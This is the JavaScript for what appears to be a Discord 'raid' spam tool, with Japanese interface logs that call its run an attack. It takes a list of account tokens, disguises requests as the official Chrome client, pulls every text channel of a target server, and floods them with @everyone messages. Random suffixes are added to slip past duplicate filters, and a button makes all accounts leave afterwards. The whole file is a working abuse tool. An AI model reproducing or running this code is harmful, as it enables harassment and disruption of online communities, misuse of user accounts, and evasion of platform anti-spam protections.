const log = msg => {
  const t = new Date().toLocaleTimeString('ja-JP');
  document.getElementById('log').innerHTML += `<div>[\( {t}] \){msg}</div>`;
  document.getElementById('log').scrollTop = 99999;
};

let tokens = [], running = false, stop = false;

const headers = token => ({
  'Authorization': token,
  'Content-Type': 'application/json',
  'X-Super-Properties': btoa(JSON.stringify({
    os: "Windows", browser: "Chrome", device: "", system_locale: "ja-JP",
    browser_user_agent: navigator.userAgent, browser_version: "134.0",
    os_version: "10", referrer: "", referring_domain: "",
    release_channel: "stable", client_build_number: 999999
  }))
});

async function send(token, ch, content, opts = {}) {
  const payload = { content: content || '' };
  if (opts.everyone) payload.content = '@everyone\n' + payload.content;
  if (opts.randomize) payload.content += `\n${crypto.randomUUID()}`;
  if (opts.randomString) payload.content += ' ' + Math.random().toString(36).slice(2, 10);
  if (opts.poll) payload.poll = opts.poll;

  try {
    const res = await fetch(`https://discord.com/api/v10/channels/${ch}/messages`, {
      method: 'POST', headers: headers(token), body: JSON.stringify(payload)
    });
    return res.ok;
  } catch { return false; }
}

document.getElementById('startBtn').onclick = async e => {
  e.preventDefault();
  if (running) return;
  running = true; stop = false;

  tokens = document.getElementById('tokens').value.trim().split(/[\s,\n]+/).filter(Boolean);
  const guild = document.getElementById('guildId').value.trim();
  let channels = document.getElementById('channelIds').value.trim().split(/[\s,\n]+/).filter(Boolean);
  const msg = document.getElementById('message').value;
  const delay = parseFloat(document.getElementById('delay').value) * 1000 || 800;
  const limit = parseInt(document.getElementById('limit').value) || Infinity;

  if (!tokens.length || !guild) return log('トークンまたはサーバーIDを入力');
  if (!channels.length) {
    log('チャンネル取得中...');
    const chs = await fetch(`https://discord.com/api/v10/guilds/${guild}/channels`, {headers: headers(tokens[0])}).then(r => r.json());
    channels = chs.filter(c => c.type === 0).map(c => c.id);
  }

  log(`攻撃開始 → ${channels.length}チャンネル`);

  let count = 0;
  while (running && count < limit && !stop) {
    for (const token of tokens) {
      if (stop) break;
      for (const ch of channels) {
        if (stop) break;
        const content = document.getElementById('randomize').checked ? msg + `\n${Date.now()}` : msg;
        const success = await send(token, ch, content, {
          everyone: document.getElementById('everyone').checked,
          randomize: document.getElementById('randomize').checked,
          randomString: document.getElementById('randomString').checked
        });
        if (success) count++;
        await new Promise(r => setTimeout(r, delay));
      }
    }
  }
  running = false;
  log('完了');
};

document.getElementById('stopBtn').onclick = () => { stop = true; running = false; log('停止'); };
document.getElementById('leaveBtn').onclick = async () => {
  const guild = document.getElementById('guildId').value.trim();
  for (const t of tokens) {
    await fetch(`https://discord.com/api/v10/users/@me/guilds/${guild}`, {
      method: 'DELETE', headers: headers(t)
    });
  }
  log('退出完了');
};

document.getElementById('autoFillChannels').onclick = async () => {
  const token = tokens[0] || document.getElementById('tokens').value.split('\n')[0];
  const guild = document.getElementById('guildId').value.trim();
  if (!token || !guild) return log('トークンとサーバーIDを入力');
  const chs = await fetch(`https://discord.com/api/v10/guilds/${guild}/channels`, {headers: headers(token)}).then(r => r.json());
  document.getElementById('channelIds').value = chs.filter(c => c.type === 0).map(c => c.id).join('\n');
  log('チャンネル取得完了');
};

log('起動完了');
